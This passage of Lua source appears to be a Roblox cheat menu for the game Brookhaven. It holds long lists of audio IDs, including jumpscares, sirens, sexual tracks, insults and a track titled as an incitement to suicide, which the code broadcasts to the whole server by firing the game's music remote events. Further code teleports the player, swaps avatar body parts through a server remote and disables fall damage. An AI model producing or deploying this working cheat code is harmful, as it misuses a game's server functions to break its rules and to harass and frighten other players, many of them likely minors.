      { name = "ifood", id = "133843750864059" },
      { name = "pelo geito ela ta querendo ram", id = "94395705857835" },
      { name = "lula vai todo mundo", id = "136804576009416" },
      { name = "coringa", id = "84663543883498" }, { name = "shoope", id = "8747441609" },
      { name = "quenojo", id = "103440368630269" },
      { name = "sai dai lava prato", id = "101232400175829" },
      { name = "se e loko numconpeÃ§a", id = "78442476709262" },
      { name = "mita sequer que eu too uma", id = "94889439372168" },
      { name = "Hoje vou ser tua mulher e tu", id = "90844637105538" },
      { name = "Deita aqui eu mandei vc deitar sirens", id = "100291188941582" },
      { name = "miau", id = "131804436682424" }, { name = "skibidi", id = "128771670035179" },
      { name = "BIRULEIBI", id = "121569761604968" },
      { name = "biseabesjnjkasnakjsndjkafb", id = "133106998846260" },
      { name = "vai corinthians!!....", id = "127012936767471" },
      { name = "my sigman", id = "103431815659907" }, { name = "mama", id = "106850066985594" },
      { name = "OH MY GOD", id = "73349649774476" },
      { name = "aahhh plankton meme", id = "95982351322190" },
      { name = "CHINABOY", id = "84403553163931" },
      { name = "PASTOR MIRIM E A LÃNGUA DOS ANJOS", id = "71153532555470" },
      { name = "Sai d3sgraÃ§@", id = "106973692977609" },
      { name = "opa salve tudo bem?", id = "80870678096428" },
      { name = "OLHA O CARRO DO DANONE", id = "110493863773948" },
      { name = "NÃ£ooooo, NÃ£ooooo, NÃ£ooo!!!!!", id = "95825536480898" },
      { name = "UM PÃ‰ DE SIRIGUELA KK", id = "112804043442210" },
      { name = "e o carro da pamonha", id = "94951629392683" },
      { name = "BOM DIAAAAAAAAAA", id = "136579844511260" },
      { name = "ai-meu-chiclete", id = "92911732806153" },
      { name = "posso te ligar ou tua mulher...", id = "103211341252816" },
      { name = "Boa chi joga muito cara", id = "110707564387669" },
      { name = "Oqueee meme", id = "120092799810101" },
      { name = "kkk muito fei", id = "79241074803021" },
      { name = "lula cade o ze gotinha", id = "86012585992725" },
      { name = "morreu", id = "8872409975" },
      { name = "a-pia-ta-cheia-de-louca", id = "98076927129047" },
      { name = "Mahito killSong", id = "128669424001766" },
      { name = "Sucumba", id = "7946300950" },
      { name = "nem clicou o thurzin", id = "84428355313544" },
      { name = "fiui OLHA MENSAGEM", id = "121668429878811" },
      { name = "tooomeee", id = "128319664118768" },
      { name = "risada de ladrao", id = "133065882609605" },
      { name = "E o PIX nada ainda", id = "113831443375212" },
      { name = "Vo nada vo nada", id = "89093085290586" },
      { name = "Eli gosta", id = "105012436535315" },
      { name = "um cavalo de tres pernas?", id = "8164241439" },
      { name = "voces sao um bado de fdp", id = "8232773326" },
      { name = "HAHA TROLLEI ATÃ‰ VOCÃŠ", id = "7021794555" },
      { name = "Calaboca Kenga", id = "86494561679259" },
      { name = "alvincut", id = "88788640194373" },
      { name = "e a risada faz como?", id = "140713372459057" },
      { name = "voce deve se m@t4", id = "100227426848009" },
      { name = "receba", id = "94142662616215" }, { name = "UUIIII", id = "73210569653520" },
      { name = "sai", id = "121169949217007" },
      { name = "risada boa dms", id = "127589011971759" },
      { name = "vacilo perna de pau", id = "106809680656199" },
      { name = "gomo gomo no!!!", id = "137067472449625" },
      { name = "arroto", id = "140203378050178" }, { name = "iraaaa", id = "136752451575091" },
      { name = "nÃ£o fica se achando muito nÃ£o", id = "101588606280167" },
      { name = "WhatsApp notificaÃ§aoV1", id = "107004225739474" },
      { name = "WhatsApp notificaÃ§aoV2", id = "18850631582" },
      { name = "SamsungV1", id = "123767635061073" },
      { name = "SamsungV2", id = "96579234730244" },
      { name = "Shiiii", id = "120566727202986" },
      { name = "ai_tomaa miku", id = "139770074770361" },
      { name = "Miku Miku", id = "72812231495047" },
      { name = "kuru_kuru", id = "122465710753374" },
      { name = "PM ROCAM", id = "96161547081609" },
      { name = "cavalo!!", id = "78871573440184" },
      { name = "deixa os garoto brinca", id = "80291355054807" },
      { name = "flamengo", id = "137774355552052" },
      { name = "sai do mei satnas", id = "127944706557246" },
      { name = "namoral agora e a hora", id = "120677947987369" },
      { name = "n pode me chutar pq seu celebro e burro", id = "82284055473737" },
      { name = "vc ta fudido vou te pegar", id = "120214772725166" },
      { name = "deley", id = "102906880476838" },
      { name = "Tu e um beta", id = "130233956349541" },
      { name = "Porfavor n tira eu nao", id = "85321374020324" },
      { name = "OlÃ¡ beleza vc pode me dÃ¡ muitos", id = "74235334504693" },
      { name = "Discord sus", id = "122662798976905" },
      { name = "rojao apito", id = "6549021381" }, { name = "off", id = "1778829098" },
      { name = "Kazuma kazuma", id = "127954653962405" },
      { name = "sometourado", id = "123592956882621" },
      { name = "Estouradoespad", id = "136179020015211" },
      { name = "Alaku bommm", id = "110796593805268" },
      { name = "busss", id = "139841197791567" },
      { name = "Estourado wItb", id = "137478052262430" },
      { name = "sla", id = "116672405522828" }, { name = "HA HA HA", id = "138236682866721" },
    },
  }, "pankapakan")

  tab:AddSection({ " tacØ§Ø± o terror ou efeito no server" })

  makeSound("Selecione um terror ou efeito", {
    ["efeito/terror"] = {
      { name = "jumpscar", id = "91784486966761" },
      { name = "n se preocupe", id = "87041057113780" },
      { name = "eles estao todos mortos", id = "70605158718179" },
      { name = "gritoestourado", id = "7520729342" },
      { name = "gritomedo", id = "113029085566978" }, { name = "Nukesiren", id = "9067330158" },
      { name = "nuclear sirenv2", id = "675587093" },
      { name = "Alertescola", id = "6607047008" },
      { name = "Memealertsiren", id = "8379374771" }, { name = "sirenv3", id = "6766811806" },
      { name = "Alarm estourAAAA...", id = "93354528379052" },
      { name = "MegaMan Alarm", id = "1442382907" },
      { name = "Alarm bookhaven", id = "1526192493" },
      { name = "alet malaysia", id = "7714172940" }, { name = "Risada", id = "79191730206814" },
      { name = "Hahahah", id = "90096947219465" }, { name = "scream", id = "314568939" },
      { name = "Terrified meme scream", id = "5853668794" },
      { name = "Sonic.exe Scream Effect", id = "146563959" },
      { name = "Demon Scream", id = "2738830850" },
      { name = "SCP-096 Scream (raging)", id = "343430735" },
      { name = "Nightmare Yelling Bursts", id = "9125713501" },
      { name = "HORROR SCREAM 07", id = "9043345732" },
      { name = "Female Scream Woman Screams", id = "9114397912" },
      { name = "Scream1", id = "1319496541" }, { name = "Scream2", id = "199978176" },
      { name = "scary maze scream", id = "270145703" },
      { name = "SammyClassicSonicFan's Scream", id = "143942090" },
      { name = "FNAF 2 Death Scream", id = "1572549161" },
      { name = "cod zombie scream", id = "8566359672" },
      { name = "Slendytubbies- CaveTubby Scream", id = "1482639185" },
      { name = "FNAF 2 Death Scream", id = "5537531920" },
      { name = "HORROR SCREAM 15", id = "9043346574" },
      { name = "Jumpscare Scream", id = "6150329916" },
      { name = "FNaI: Security Breach", id = "2050522547" },
      { name = "llllllll", id = "5029269312" }, { name = "loud jumpscare", id = "7236490488" },
      { name = "fnaf", id = "6982454389" },
      { name = "Pinkamena Jumpscare 1", id = "192334186" },
      { name = "Ennard Jumpscare 2", id = "629526707" },
      { name = "a sla medo dino", id = "125506416092123" },
      { name = "Backrooms Bacteria Pitfalls ", id = "81325342128575" },
      { name = "error Infinite", id = "3893790326" },
      { name = "Screaming Meme", id = "107732411055226" },
      { name = "Jumpscare - SCP CB", id = "97098997494905" },
      { name = "mirror jumpscare", id = "80005164589425" },
      { name = "PTLD-39 Jumpscare", id = "5581462381" },
      { name = "jumpscare:Play()", id = "121519648044128" },
      { name = "mimic jumpscare", id = "91998575878959" },
      { name = "DOORS Glitch Jumpscare Sound", id = "96377507894391" },
      { name = "FNAS 4 Nightmare Mario", id = "99804224106385" },
      { name = "Death House I Jumpscare Sound", id = "8151488745" },
      { name = "Shinky Jumpscare", id = "123447772144411" },
      { name = "FNaTI Jumpscare Oblitus casa", id = "18338717319" },
      { name = "fnaf jumpscare loadmode", id = "18911896588" },
    },
  }, "jumpscar")

  function f25(p24)
    replicatedStorage:WaitForChild("RE"):WaitForChild("PlayerToolEvent"):FireServer(unpack({
      "ToolMusicText", p24,
    }))

    replicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack({
      "PickHouseMusicText", p24,
    }))

    replicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack({
      "PickingCarMusicText", p24,
    }))

    replicatedStorage:WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack({
      "PickingScooterMusicText", p24,
    }))
  end

  tab:AddTextBox({
    Name = "ID da mÃºsica",
    PlaceholderText = "Digite o ID e pressione Enter",
    Callback = function(value80)
      if value80 and value80 ~= "" then
        f25(tostring(value80))
      end
    end,
  })

  local function f33(name4, p25, default2)
    local v141 = {}
    local v142 = {}

    for key2, value81 in pairs(p25) do
      for index58, value82 in ipairs(value81) do
        if value82.name ~= "" then
          table.insert(v141, value82.name)
          v142[value82.name] = { id = value82.id, category = key2 }
        end
      end
    end

    local function f34(id3)
      f25(tostring(id3))
    end

    tab:AddDropdown({
      Name = name4,
      Description = "all",
      Default = default2,
      Multi = false,
      Options = v141,
      Callback = function(value83)
        if value83 and v142[value83] then
          local id4 = v142[value83].id

          if id4 and id4 ~= "" and id4 ~= "4354908569" then
            f34(id4)
          end
        end
      end,
    })
  end

  f33("ForrÃ³", {
    forro = {
      { name = "forrÃ³ ja cansou", id = "74812784884330" },
      { name = "lenbro ate hoje", id = "71531533552899" },
      { name = "escolha certa", id = "107088620814881" },
      { name = "forrÃ³ da rezenha", id = "120973520531216" },
      { name = "forrÃ³ dudu", id = "74404168179733" },
      { name = "forrÃ³ sao joao", id = "106364874935196" },
      { name = "forrÃ³ engraÃ§ado paia", id = "76524290482399" },
      { name = "100% forro vaquejada", id = "92295159623916" },
      { name = "PASTOR MIRIM E A LÃNGUA DOS ANJOS", id = "71153532555470" },
      { name = "PARA NÃƒO ESQUECER QUEM SOMOS", id = "88937498361674" },
      { name = "Uno zero", id = "112959083808887" },
      { name = "Iate do neymar", id = "135738534706063" },
      { name = "Batidao na aldeia", id = "79953696595578" },
    },
  }, "Option 1")

  f33("MÃºsicas e Memes AleatÃ³rio", {
    forro = {
      { name = "ANXIETY (Amapiano Re-fix)", id = "101483901475189" },
      { name = "Meu corpo, minhas regras", id = "127587901595282" },
      { name = "$$$$gg$$$$gg", id = "137471775091253" },
      { name = "Megalovania but its only the melodies", id = "104500091160463" },
      { name = "androphono strikes back", id = "78312089943968" },
      { name = "Bamm Bamm", id = "128730685516895" },
      { name = "chupa cabra", id = "132890273173295" },
      { name = "longe de mais", id = "124478512057763" },
      { name = "Garoto de Copacabana", id = "135648634110254" },
      { name = "CELL!", id = "117634275895085" },
      { name = "Boa vibe em Ubatuba", id = "139059061493558" },
      { name = "SLIP AWAY", id = "126152928520174" },
      { name = "Alone in Motion", id = "122379348696948" },
      { name = "Fade Away", id = "81002139735874" },
      { name = "Wounds & Wishes", id = "109347979566607" },
      { name = "AscensÃ£o do Monarca", id = "101864243033211" },
      { name = "carro do ovo", id = "3148329638" },
      { name = "ingles bus (fling ou kill bus)", id = "123268013026823" },
      { name = "MIKU MIKU HATSUNE", id = "112783541496955" },
      { name = "Five Nights at Freddy's", id = "110733765539890" },
      { name = "Rat Dance", id = "133496635668044" },
      { name = "Escalando a SeleÃ§Ã£o Brasileira para a Copa", id = "116546457407236" },
    },
  }, "Option 1")

  f33("Funk", {
    Funk = {
      { name = "sua mulher funk", id = "90844637105538" },
      { name = "fuga na viatura", id = "131891110268352" },
      { name = "funkphonk fumando verde", id = "112143944982807" },
      { name = "cauma xmara", id = "95664293972405" },
      { name = "que que sharke", id = "129546408528391" },
      { name = "Il Cacto Hipopotamo FUNK", id = "104491656009142" },
      { name = "Espressora Signora FUNK", id = "123394392737234" },
      { name = "trippi troop funk", id = "73049389767013" },
      { name = "bombini funkphonk", id = "88814770244609" },
      { name = "pre treino", id = "136869502216760" },
      { name = "CVRL", id = "124244582950595" },
      { name = "batida Brega Violino (Beat Brega Funk)", id = "99399643204701" },
      { name = "DanÃ§a do Canguru (Pke Gaz1nh)", id = "86876136192157" },
      { name = "espere 30segundos!! Ondas sonoras", id = "127757321382838" },
      { name = "MONTAGEM ARABIANA (Pke Gaz1nh)", id = "78076624091098" },
      { name = "Manda o papo (NGI)", id = "132642647937688" },
      { name = "Viver bem", id = "82805460494325" },
      { name = "Faixa estronda", id = "121187736532042" },
      { name = "Ritmo Pixelado", id = "93928823862203" },
      { name = "Viagem Sonora", id = "79349174602261" },
      { name = "Melodia Virtual", id = "139147474886402" },
      { name = "Melodia Serena", id = "97011217688307" },
      { name = "SENTA", id = "124085422276732" },
      { name = "TUNG TUNG TUNG TUNG SAHUR PHONK BRASILEIRO", id = "120353876640055" },
      { name = "crazy-lol", id = "106958630419629" }, { name = "V7", id = "80348640826643" },
      { name = "UIUAH", id = "82894376737849" },
      { name = "meta ritmo", id = "110091098283354" },
      { name = "CAPPUCCINO ASSASSINO (SPEDUP)", id = "132733033157915" },
      { name = "haha (NGI)", id = "122114766584918" },
      { name = "DO PO", id = "114207745067816" },
    },
  }, "Option 1")

  f33("Phonk", {
    phonk = {
      { name = "wyles", id = "85385155970460" },
      { name = "phonk kawai", id = "91502410121438" },
      { name = "querendo da a bucet@", id = "72720721570850" },
      { name = "vem no pocpoc", id = "102333419023382" },
      { name = "tatiu wim", id = "122871512353520" },
      { name = "novinha sapeca", id = "111668097052966" },
      { name = "novinha representa", id = "93786060174790" },
      { name = "phonk1", id = "77501611905348" }, { name = "phonk2", id = "126887144190812" },
      { name = "phonk osadia", id = "88033569921555" },
      { name = "phonk sarra", id = "132436320685732" },
      { name = "relaionamento sem crush", id = "105832154444494" },
      { name = "phonk3", id = "90323407842935" },
      { name = "novinha danÃ§apanpa", id = "132245626038510" },
      { name = "phonk sexoagreÃ§ivo", id = "111995323199676" },
      { name = "phonk4", id = "115016589376700" }, { name = "phonk5", id = "118740708757685" },
      { name = "phonk6", id = "139435437308948" },
      { name = "phonk chapaquente", id = "109189438638906" },
      { name = "phonk rajada", id = "105126065014034" },
      { name = "rede globo", id = "138487820505005" },
      { name = "phonk indiano", id = "87968531262747" },
      { name = "vapo do vapo", id = "106317184644394" },
      { name = "tutatatutata", id = "112068892721408" },
      { name = "phonk slower", id = "122852029094656" },
      { name = "phonk9", id = "91760524161503" }, { name = "phonk10", id = "73140398421340" },
      { name = "phonk11", id = "137962454483542" }, { name = "phonk12", id = "84733736048142" },
      { name = "phonk13", id = "106322173003761" }, { name = "phonk14", id = "94604796823780" },
      { name = "phonk15", id = "118063577904953" },
      { name = "phonk16", id = "115567432786512" },
      { name = "phonk toq", id = "71304501822029" },
      { name = "phonk hey", id = "132218979961283" },
      { name = "phonk17", id = "102708912256857" },
      { name = "phonk18", id = "140642559093189" }, { name = "phonk neve", id = "13530439660" },
      { name = "phonk19", id = "87863924786534" }, { name = "phonk20", id = "133135085604736" },
      { name = "phonk lento", id = "97258811783169" },
      { name = "phonk21", id = "92308400487695" }, { name = "tipo wym", id = "88064647826500" },
      { name = "estouradassa1", id = "92175624643620" },
      { name = "estouradassa2", id = "108099943758978" },
      { name = "Naaaaa", id = "109784877184952" }, { name = "trem", id = "114608169341947" },
      { name = "eoropa", id = "111346133543699" },
      { name = "atimosphekika", id = "77857496821844" },
      { name = "phonk ALL THE TIME", id = "123809083385992" },
      { name = "Lifelong Memory", id = "81929101024622" },
      { name = "Automotivo Blondie (Pke Gaz1nh)", id = "74564219749776" },
      { name = "à¸ªà¸§à¸±à¸ªà¸”à¸µà¸„à¸™à¹„à¸—à¸¢ v2", id = "118225359190317" },
      { name = "MTG TU VAI SENTAR (Pke Gaz1nh)", id = "115317874112657" },
      { name = "SARRA FUNK", id = "96249826607044" },
      { name = "Catuquanvan", id = "88038595663211" },
      { name = "F-D-1 (slowed)", id = "124958445624871" },
      { name = "Sucessagem", id = "88551699463723" },
      { name = "ILOVE phonksla", id = "82148953715595" },
      { name = "SPEED SLIDE", id = "118959437310311" },
      { name = "TOMA FUNK PHONK", id = "126291069838831" },
      { name = "PASSO BEM SOLTO X NEW JAZZ", id = "122706595087279" },
      { name = "MONTAGEM BIONICA DIAMANTE", id = "122338822665007" },
      { name = "BALA SELVAGEM!", id = "96180057167470" },
      { name = "Luz <3", id = "74281337525581" }, { name = "COMO TU", id = "86928685812280" },
      { name = "MONTAGEM SOLAR TROPICANO (SPEED UP)", id = "116461681407294" },
      { name = "MONTAGEM SOLAR TROPICANO (SLOWED)", id = "109308273341422" },
      { name = "YO DE TI", id = "125181345407169" },
      { name = "Beauty, (Phonk), Super sped up", id = "71123357599630" },
      { name = "MONTAGEM BOOMBOX DO MALA FUNK", id = "86537505028256" },
      { name = "BRAZIL DO FUNK", id = "133498554139200" },
      { name = "BRR BRR PATAPIM FUNK", id = "117170901476451" },
      { name = "MONTAGEM TERRA BELA FUNK", id = "134770548505933" },
      { name = "FUNK DO RAVE 1.0", id = "137135395010424" },
      { name = " Portao Funk", id = "70900514961735" },
      { name = " EspaÃ§o Funk", id = "110519906029322" },
      { name = " FUTABA", id = "91834632690710" },
      { name = " MelÃ³dica ExplosÃ£o De Melodia", id = "98371771055411" },
      { name = " RASGO", id = "98267810117949" },
      { name = " HIPNOTIZA", id = "117668905142866" },
      { name = "CRISTAL NOTURNO", id = "103695219371872" },
      { name = " SKY HIGH", id = "123517126955383" },
      { name = "MIKU top", id = "102771149931910" },
      { name = " ACABU SO FUNK", id = "127870227978818" },
      { name = "CREATIFE FUNK", id = "130525387712209" },
      { name = "GOTH FUNK", id = "97662362226511" },
      { name = "PORTUGESE FUNK", id = "125858109122379" },
      { name = "SUBURBANA", id = "139825057894568" },
      { name = "ESPERA LA NOCHE FUNK", id = "139768056738146" },
      { name = "SIN PERMISO FUNK", id = "92572896648274" },
      { name = "MONTAGEM DACE RAT", id = "98711199754623" },
      { name = " LOVELY FUNK", id = "130633105268814" },
      { name = "STORYMODECOOL", id = "87115976125426" },
      { name = "BLACK COFFEE FUNK", id = "82705137378395" },
      { name = "KOBALT", id = "79381341943021" },
      { name = " andante bacterial", id = "105882833374061" },
      { name = "ANGEL Speed Up", id = "139593870988593" },
      { name = "LUTA Ã‰PICA", id = "73966367524216" },
      { name = "MALDITA", id = "133814632960968" },
      { name = "DA ZONA NTJ VERSON", id = "105770593501071" },
      { name = "HIPNOTIZA", id = "132015050363205" },
      { name = "MIDZUKI speed up", id = "129151948619922" },
      { name = "movimenta funk", id = "114994598691121" },
      { name = "CRISTAL", id = "103445348511856" },
      { name = "Letero funkphonk", id = "99409598156364" },
    },
  }, "Option 1")

  tab:AddButton({ Name = "Stop", Description = "ALL music", Callback = function() f25("") end })
  tab7:AddSection({ "teleport" })
  localPlayer5 = players.LocalPlayer
  v16 = "Morro"

  v17 = {
    Morro = Vector3.new(-348.64, 65.94, -458.08),
    ["PraÃ§a"] = Vector3.new(-26.17, 3.48, -0.93),
    Banco = Vector3.new(1.99, 3.32, 236.65),
    Hospital = Vector3.new(-303.2, 3.4, 13.74),
    Prefeitura = Vector3.new(-354.65, 7.32, -102.16),
    Fazenda = Vector3.new(-766.41, 2.92, -61.1),
    Mercado = Vector3.new(16.31, 3.32, -107.07),
    Shopping = Vector3.new(151.05, 3.52, -190.64),
    Aeroporto = Vector3.new(290.23, 4.32, 42.57),
    Hotel = Vector3.new(159.1, 3.32, 164.97),
    ["Beira-mar 1"] = Vector3.new(55.69, 2.94, -1403.6),
    ["Beira-mar 2"] = Vector3.new(42.39, 2.94, 1336.14),
  }

  tab7:AddDropdown({
    Name = "Locais de Brookhaven",
    Description = "Selecione um local para teleportar",
    Default = v16,
    Multi = false,
    Options = {
      "Morro", "PraÃ§a", "Banco", "Hospital", "Prefeitura", "Fazenda", "Mercado", "Shopping",
      "Aeroporto", "Hotel", "Beira-mar 1", "Beira-mar 2",
    },
    Callback = function(value84) v16 = value84 end,
  })

  tab7:AddButton({
    Name = "Teleportar",
    Description = "Teleporta para o local selecionado",
    Callback = function()
      local humanoidRootPart29 = localPlayer5.Character
        and localPlayer5.Character:FindFirstChild("HumanoidRootPart")

      local humanoidRootPart30, humanoid25, v143

      if humanoidRootPart29 then
        humanoidRootPart30 = localPlayer5.Character.HumanoidRootPart
        humanoid25 = localPlayer5.Character:FindFirstChildOfClass("Humanoid")
        v143 = v17[v16]

        if v143 then
          pcall(function()
            if humanoid25 then
              humanoid25:ChangeState(Enum.HumanoidStateType.Physics)
              humanoid25.WalkSpeed = 0
            end

            humanoidRootPart30.Anchored = true
            humanoidRootPart30.CFrame = CFrame.new(v143)

            task.wait(0.4)
            humanoidRootPart30.Anchored = false

            if humanoid25 then
              humanoid25.WalkSpeed = 16
              humanoid25:ChangeState(Enum.HumanoidStateType.Running)
            end
          end)
        end
      end
    end,
  })

  tab8:AddSection({ "Nuke" })
  loadAnimation = nil
  loadAnimation2 = nil
  v18 = {}

  function f26()
    if loadAnimation2 then
      pcall(function()
        loadAnimation2:Stop()
        loadAnimation2:Destroy()
      end)
      loadAnimation2 = nil
    end

    if loadAnimation then
      pcall(function()
        loadAnimation:Stop()
        loadAnimation:Destroy()
      end)
      loadAnimation = nil
    end

    local character16 = players.LocalPlayer.Character

    if character16 then
      local humanoid26 = character16:FindFirstChild("Humanoid")

      if humanoid26 then
        local animator = humanoid26:FindFirstChild("Animator")

        if animator then
          for key4, value85 in pairs(animator:GetPlayingAnimationTracks()) do
            local v144 = value85

            if v144.Animation then
              local animationId = v144.Animation.AnimationId

              if animationId == "rbxassetid://70883871260184"
                or animationId == "rbxassetid://3695333486" then
                pcall(function() v144:Stop() end)
              end
            end
          end
        end
      end
    end
  end

  tab8:AddToggle({
    Name = "Nuke",
    Default = false,
    Callback = function(value86)
      local v145

      if value86 then
        local character17 = players.LocalPlayer.Character

        if character17 then
          local humanoid27 = character17:FindFirstChildOfClass("Humanoid")

          if humanoid27 then
            local getAppliedDescription3 = humanoid27:GetAppliedDescription()

            v18 = {
              Torso = getAppliedDescription3.Torso,
              RightArm = getAppliedDescription3.RightArm,
              LeftArm = getAppliedDescription3.LeftArm,
              RightLeg = getAppliedDescription3.RightLeg,
              LeftLeg = getAppliedDescription3.LeftLeg,
              Head = getAppliedDescription3.Head,
            }

            task.wait(0.2)
            task.wait(0.3)

            local animation = Instance.new("Animation")
            animation.AnimationId = "rbxassetid://70883871260184"

            loadAnimation = humanoid27:LoadAnimation(animation)
            loadAnimation.Priority = Enum.AnimationPriority.Action4
            loadAnimation:Play(0.1, 1, 0.01)

            task.wait(0.5)

            local animation2 = Instance.new("Animation")
            animation2.AnimationId = "rbxassetid://3695333486"

            loadAnimation2 = humanoid27:LoadAnimation(animation2)
            loadAnimation2.Priority = Enum.AnimationPriority.Movement
            loadAnimation2:Play(0.1, 1, 0)
          end
        end
      else
        f26()
        task.wait(0.2)

        if next(v18) then
          local character18 = players.LocalPlayer.Character

          if character18 then
            if character18:FindFirstChildOfClass("Humanoid") then
              v145 = {
                { v18.Torso, v18.RightArm, v18.LeftArm, v18.RightLeg, v18.LeftLeg, v18.Head },
              }

              pcall(function()
                replicatedStorage.Remotes.ChangeCharacterBody:InvokeServer(unpack(v145))
              end)

              v18 = {}
            end
          end
        end
      end
    end,
  })

  loadAnimation3 = nil
  loadAnimation4 = nil
  v19 = {}

  function f27()
    if loadAnimation4 then
      pcall(function()
        loadAnimation4:Stop()
        loadAnimation4:Destroy()
      end)
      loadAnimation4 = nil
    end

    if loadAnimation3 then
      pcall(function()
        loadAnimation3:Stop()
        loadAnimation3:Destroy()
      end)
      loadAnimation3 = nil
    end
  end

  tab8:AddToggle({
    Name = "Nuke FlashBack",
    Default = false,
    Callback = function(value87)
      local v146, v147

      if value87 then
        local character19 = players.LocalPlayer.Character

        if character19 then
          local humanoid28 = character19:FindFirstChildOfClass("Humanoid")

          if humanoid28 then
            local getAppliedDescription4 = humanoid28:GetAppliedDescription()

            v19 = {
              Torso = getAppliedDescription4.Torso,
              RightArm = getAppliedDescription4.RightArm,
              LeftArm = getAppliedDescription4.LeftArm,
              RightLeg = getAppliedDescription4.RightLeg,
              LeftLeg = getAppliedDescription4.LeftLeg,
              Head = getAppliedDescription4.Head,
            }

            task.wait(0.2)

            v147 = {
              123402086843880, 100839513065430, 78300682916056, 86276701020724, 78409653958165,
              15093053680,
            }

            pcall(function() replicatedStorage.Remotes.ChangeCharacterBody:InvokeServer(v147) end)
            task.wait(0.3)

            local animation3 = Instance.new("Animation")
            animation3.AnimationId = "rbxassetid://70883871260184"

            loadAnimation3 = humanoid28:LoadAnimation(animation3)
            loadAnimation3.Priority = Enum.AnimationPriority.Action4
            loadAnimation3:Play(0.1, 1, 1)

            task.wait(0.1)
            loadAnimation3:AdjustSpeed(5)
            task.wait(0.3)

            local animation4 = Instance.new("Animation")
            animation4.AnimationId = "rbxassetid://3695333486"

            loadAnimation4 = humanoid28:LoadAnimation(animation4)
            loadAnimation4.Priority = Enum.AnimationPriority.Movement
            loadAnimation4:Play(0.1, 1, 0)
          end
        end
      else
        f27()
        task.wait(0.2)

        if next(v19) then
          local character20 = players.LocalPlayer.Character

          if character20 then
            if character20:FindFirstChildOfClass("Humanoid") then
              v146 = {
                { v19.Torso, v19.RightArm, v19.LeftArm, v19.RightLeg, v19.LeftLeg, v19.Head },
              }

              pcall(function()
                replicatedStorage.Remotes.ChangeCharacterBody:InvokeServer(unpack(v146))
              end)

              v19 = {}
            end
          end
        end
      end
    end,
  })

  tab8:AddSection({ "Skybox FE" })

  tab8:AddDropdown({
    Name = "Camisas",
    Options = { "Scary", "Hacker", "Anonymous" },
    Callback = function(value88) end,
  })

  tab8:AddTextBox({
    Name = "ID da Camisa",
    PlaceholderText = "Insira o ID da camisa",
    Callback = function(value89)
      local v148 = tonumber(value89)
      local v149

      if v148 then
        v149 = { v148 }

        pcall(function()
          replicatedStorage:WaitForChild("Remotes"):WaitForChild("WearShirt"):InvokeServer(unpack(v149))
        end)
      end
    end,
  })

  _G.SkyboxActive = _G.SkyboxActive or false
  _G.CurrentTrack = _G.CurrentTrack or nil
  _G.RigidTrack = _G.RigidTrack or nil

  local g = _G
  g.savedBodyParts = _G.savedBodyParts or {}

  function f28()
    if _G.RigidTrack then
      pcall(function()
        _G.RigidTrack:Stop()
        _G.RigidTrack:Destroy()
      end)
      _G.RigidTrack = nil
    end

    if _G.CurrentTrack then
      pcall(function()
        _G.CurrentTrack:Stop()
        _G.CurrentTrack:Destroy()
      end)
      _G.CurrentTrack = nil
    end

    local character21 = players.LocalPlayer.Character

    if character21 then
      local humanoid29 = character21:FindFirstChild("Humanoid")

      if humanoid29 then
        local animator2 = humanoid29:FindFirstChild("Animator")

        if animator2 then
          for key4, value90 in pairs(animator2:GetPlayingAnimationTracks()) do
            local v150 = value90

            if v150.Animation then
              local animationId2 = v150.Animation.AnimationId

              if animationId2 == "rbxassetid://70883871260184"
                or animationId2 == "rbxassetid://3695333486" then
                pcall(function() v150:Stop() end)
              end
            end
          end
        end
      end
    end
  end

  tab8:AddToggle({
    Name = "Skybox",
    Default = _G.SkyboxActive or false,
    Callback = function(value91)
      _G.SkyboxActive = value91
      local v151

      if value91 then
        local character22 = players.LocalPlayer.Character

        if character22 then
          local humanoid30 = character22:FindFirstChildOfClass("Humanoid")

          if humanoid30 then
            local getAppliedDescription5 = humanoid30:GetAppliedDescription()

            _G.savedBodyParts = {
              Torso = getAppliedDescription5.Torso,
              RightArm = getAppliedDescription5.RightArm,
              LeftArm = getAppliedDescription5.LeftArm,
              RightLeg = getAppliedDescription5.RightLeg,
              LeftLeg = getAppliedDescription5.LeftLeg,
              Head = getAppliedDescription5.Head,
            }

            task.wait(0.2)
            v151 = { { 100839513065430, nil, nil, nil, nil, nil } }

            pcall(function()
              replicatedStorage.Remotes.ChangeCharacterBody:InvokeServer(unpack(v151))
            end)

            task.wait(0.3)

            local animation5 = Instance.new("Animation")
            animation5.AnimationId = "rbxassetid://70883871260184"

            _G.CurrentTrack = humanoid30:LoadAnimation(animation5)
            _G.CurrentTrack.Priority = Enum.AnimationPriority.Action4
            _G.CurrentTrack:Play(0.1, 1, 0.01)

            task.wait(0.5)

            local animation6 = Instance.new("Animation")
            animation6.AnimationId = "rbxassetid://3695333486"

            _G.RigidTrack = humanoid30:LoadAnimation(animation6)
            _G.RigidTrack.Priority = Enum.AnimationPriority.Movement
            _G.RigidTrack:Play(0.1, 1, 0)
          end
        end
      else
        f28()
        task.wait(0.2)

        if next(_G.savedBodyParts) then
          local character23 = players.LocalPlayer.Character

          if character23 then
            if character23:FindFirstChildOfClass("Humanoid") then
              _G.savedBodyParts = {}
            end
          end
        end
      end
    end,
  })

  tab9:AddSection({ "all car functions" })
  local localPlayer10 = players.LocalPlayer
  local currentCamera = workspaceService.CurrentCamera

  v20 = {}
  v20.Players = players
  v20.Workspace = workspaceService
  v20.LocalPlayer = localPlayer10
  v20.Camera = currentCamera

  function v20:MostrarNotificacao(p26)
  end

  function v20:ToggleFallDamage(p27)
    if not self.LocalPlayer.Character
      or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then
      return false
    else
      local humanoid31 = self.LocalPlayer.Character.Humanoid

      if p27 then
        humanoid31:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        humanoid31:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        humanoid31:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        humanoid31.PlatformStand = false
        return true
      end

      humanoid31:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
      humanoid31:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
      return false
    end
  end

  function v20:TeleportToSeat(index59, p28)
    if not self.LocalPlayer.Character
      or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then
      return false
    else
      local humanoid32 = self.LocalPlayer.Character.Humanoid
      local humanoidRootPart31 = self.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

